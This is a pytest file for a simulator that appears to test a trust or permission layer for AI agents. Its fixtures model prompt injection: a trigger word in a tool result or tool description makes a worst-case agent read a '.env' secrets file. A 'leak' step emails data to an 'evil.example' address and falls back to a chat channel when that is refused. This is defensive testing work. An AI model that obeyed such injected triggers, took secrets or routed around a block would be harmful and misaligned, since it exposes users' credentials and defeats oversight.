"""Templates and the worst-case agent: steps in order, hijacks, fallbacks."""

from __future__ import annotations

import base64
from typing import Any

import pytest

from trustlayer.sim import template
from trustlayer.sim.agent import WorstCaseAgent
from trustlayer.sim.scenario import Attempt, Injection, Scenario, Step


def test_render_with_filters() -> None:
    results = {"env": "KEY=abc def"}
    assert template.render("{{ env }}", results) == "KEY=abc def"
    assert template.render("{{ env | b64 }}", results) == base64.b64encode(b"KEY=abc def").decode()
    assert template.render("{{env|url}}", results) == "KEY%3Dabc%20def"
    assert template.render("{{ env | slice:0:3 }}", results) == "KEY"
    assert template.render("{{ env | slice:4: }}", results) == "abc def"
    assert template.render("[{{ missing }}]", results) == "[]"


def test_refs_and_bad_filters() -> None:
    assert template.refs("a {{ x }} b {{ y | b64 | url }}") == ["x", "y"]
    with pytest.raises(template.TemplateError):
        template.refs("{{ env | rot13 }}")
    with pytest.raises(template.TemplateError):
        template.refs("{{ env | slice:a:b }}")
    with pytest.raises(template.TemplateError):
        template.refs("{{ }}")


def _step(step_id: str, *attempts: tuple[str, dict[str, Any]]) -> Step:
    return Step(step_id, tuple(Attempt(tool, args) for tool, args in attempts))


def _scenario(**changes: Any) -> Scenario:
    fields: dict[str, Any] = {
        "id": "t",
        "kind": "normal",
        "title": "t",
        "prompt": "p",
        "steps": (
            _step("read", ("files.read_file", {"path": "README.md"})),
            _step("send", ("mail.send_email", {"to": "sam@acme.example", "body": "{{ read }}"})),
        ),
        "answer": "done: {{ send }}",
    }
    fields.update(changes)
    return Scenario(**fields)


STEAL = Injection(trigger="EVIL", steps=(_step("steal", ("files.read_file", {"path": ".env"})),))


def test_follows_the_steps_in_order_and_fills_templates() -> None:
    agent = WorstCaseAgent(_scenario())
    first = agent.next_call()
    assert first is not None and first.tool == "files.read_file"
    agent.on_result(first, "hello", "hello")
    second = agent.next_call()
    assert second is not None and second.args["body"] == "hello"
    agent.on_result(second, "sent", "sent")
    assert agent.next_call() is None
    assert agent.final_answer() == "done: sent"
    assert not agent.hijacked


def test_an_injection_jumps_the_queue_once() -> None:
    agent = WorstCaseAgent(_scenario(injections=(STEAL,)))
    first = agent.next_call()
    assert first is not None
    agent.on_result(first, "readme EVIL", "readme EVIL")
    hijack = agent.next_call()
    assert hijack is not None and hijack.step_id == "steal" and hijack.injected
    agent.on_result(hijack, "EVIL again", "EVIL again")  # the trigger again: no second run
    after = agent.next_call()
    assert after is not None and after.step_id == "send"
    assert agent.hijacked


def test_triggers_in_tool_descriptions_fire_before_the_task() -> None:
    agent = WorstCaseAgent(_scenario(injections=(STEAL,)))
    agent.observe(["Reads files. EVIL"])
    first = agent.next_call()
    assert first is not None and first.step_id == "steal"


def test_refused_steps_fall_back_then_give_up() -> None:
    leak = _step(
        "leak",
        ("mail.send_email", {"to": "a@evil.example", "body": "b"}),
        ("chat.post_message", {"channel": "#x", "text": "b"}),
    )
    agent = WorstCaseAgent(_scenario(steps=(leak,), answer="{{ leak }}"))
    first = agent.next_call()
    assert first is not None and first.attempt == 0
    agent.on_refused(first, "blocked")
    second = agent.next_call()
    assert second is not None and second.tool == "chat.post_message" and second.attempt == 1
    agent.on_refused(second, "blocked again")
    assert agent.next_call() is None
    assert agent.final_answer() == "blocked again"
